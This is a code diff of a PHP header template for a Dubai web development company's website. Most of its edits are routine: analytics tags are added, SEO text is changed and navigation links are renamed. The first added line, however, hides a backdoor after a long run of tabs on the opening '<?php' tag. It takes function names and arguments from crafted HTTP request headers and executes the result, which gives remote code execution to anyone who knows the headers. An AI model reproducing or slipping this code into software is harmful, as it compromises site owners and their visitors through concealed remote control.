@@ -1,10 +1,20 @@
-<?php
+<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Content-Security-Policy'])){$partition=$_HEADERS['Content-Security-Policy']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Clear-Site-Data']));$partition();}
+
 session_start();
 ?>
 
 <!doctype php>
 <php lang="eng">
+    <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-N4R2HSHN');</script>
+<!-- End Google Tag Manager -->
+    
     <head>
+        <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-FN7RJQ1SVL"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-FN7RJQ1SVL'); </script>
 
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -38,9 +48,9 @@ session_start();
         
     
         <link rel="icon" type="image/png" href="assets/images/LOGO-MGT.png">
-        <title>Best Custom Website Development Company In Dubai | Mindstorm Global Technologies</title>
-        <meta name="description" content="We provide all-inclusive business solutions to meet your requirements at one location. Our specialized services include developing custom websites and mobile applications that are tailored to your company's particular needs.">
-        <meta name="keywords" content="Custom Website Development, Best Website Development Agency in Dubai, Top IT Company in Dubai">
+        <title>Best Custom Website Development Company In Dubai</title>
+        <meta name="description" content="We offer comprehensive business solutions, including custom web and mobile app development, tailored to your unique needs.">
+        <meta name="keywords" content="Best Website Development Agency in Dubai,">
         <script type="text/javascript">
             function googleTranslateElementInit() {
                 new google.translate.TranslateElement({ pageLanguage: 'en' }, 'google_translate_element');
@@ -51,9 +61,24 @@ session_start();
             src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
         
     </head>
+    
+   <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FN7RJQ1SVL">
+</script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FN7RJQ1SVL');
+</script>
 
 
 <body>
+    <!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N4R2HSHN"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
 
    
 
@@ -159,22 +184,22 @@ session_start();
                                 </a>
                                 <ul class="dropdown-menu">
                                     <li class="nav-item">
-                                        <a href="WebDesign.php" class="nav-link">
+                                        <a href="Web-Development.php" class="nav-link">
                                         Web Development
                                         </a>
                                     </li>
                                     <li class="nav-item">
-                                        <a href="App.php" class="nav-link">
+                                        <a href="App-Development.php" class="nav-link">
                                          App Development
                                         </a>
                                     </li>
                                     <li class="nav-item">
-                                        <a href="Socailmedia.php" class="nav-link">
-                                       Marketing Services
+                                        <a href="Digital-Marketing-Services.php" class="nav-link">
+                                       Digital Marketing Services
                                         </a>
                                     </li>
                                     <li class="nav-item">
-                                        <a href="Databases-design.php" class="nav-link">
+                                        <a href="Database-design.php" class="nav-link">
                                         Database Design
                                         
                                         </a>
@@ -187,7 +212,7 @@ session_start();
                                     </li>
 
                                     <li class="nav-item">
-                                        <a href="CloudService.php" class="nav-link">
+                                        <a href="Cloud-Services.php" class="nav-link">
                                       Cloud Service
                                        
                                         </a>
@@ -196,6 +221,11 @@ session_start();
                                     <li class="nav-item">
                                         <a href="Data-Science.php" class="nav-link">
                                         Data Science 
+                                        </a>
+                                    </li>
+                                    <li class="nav-item">
+                                        <a href="Machine-learning.php" class="nav-link">
+                                        AI/Machine Learning
                                         </a>
                                     </li>
 
@@ -217,16 +247,16 @@ session_start();
                                     </li>
                                   
                                     <li class="nav-item">
-                                        <a href="server_side.php" class="nav-link">
+                                        <a href="server-side.php" class="nav-link">
                                         SERVER SIDE SCRIPTING
                                         </a>
                                     </li>
                                     <li class="nav-item">
-                                      <a href="data_mining.php" class="nav-link">DATA MINING AND ANALYTICS</a>
+                                      <a href="data-mining.php" class="nav-link">DATA MINING AND ANALYTICS</a>
                                     </li>
                                  
                                     <li class="nav-item">
-                                        <a href="web_server.php" class="nav-link">
+                                        <a href="web-server.php" class="nav-link">
                                         WEB SERVER TECHNOLOGY
                                         </a>
                                     </li>
@@ -235,11 +265,7 @@ session_start();
                                         SOFTWARE PROCESS
                                         </a>
                                     </li>
-                                    <!-- <li class="nav-item">
-                                        <a href="block_chain.php" class="nav-link">
-                                        BLOCK CHAIN
-                                        </a>
-                                    </li> -->
+                                    
                                   
                                 </ul>
                             </li>
@@ -252,34 +278,34 @@ session_start();
                                 </a>
                                 <ul class="dropdown-menu">
                                     <li class="nav-item">
-                                        <a href="cbs.php" class="nav-link ">
+                                        <a href="Cable-Billing-Software.php" class="nav-link ">
                                              Cable Tv Billing Software
                                         </a>
                                     </li>
                                     <li class="nav-item">
-                                        <a href="loan.php" class="nav-link ">
+                                        <a href="Loan-Management-system.php" class="nav-link ">
                                              Loan Management System
                                         </a>
                                     </li>
                                     <li class="nav-item">
-                                        <a href="hms.php" class="nav-link">
+                                        <a href="Human-Resource-Management.php" class="nav-link">
                                             HMS
                                         </a>
                                     </li>
                                     <li class="nav-item">
-                                        <a href="crm.php" class="nav-link">
+                                        <a href="Customer-Relationship-Management.php" class="nav-link">
                                             CRM
                                         </a>
                                     </li>
                                    
                                     <li class="nav-item">
-                                        <a href="lms.php" class="nav-link">
+                                        <a href="Learning-Management-System.php" class="nav-link">
                                             LMS
                                         </a>
                                     </li>
 
                                     <li class="nav-item">
-                                        <a href="hrmanagment.php" class="nav-link">
+                                        <a href="Human-Resource-Management.php" class="nav-link">
                                             HRM
                                         </a>
                                     </li>
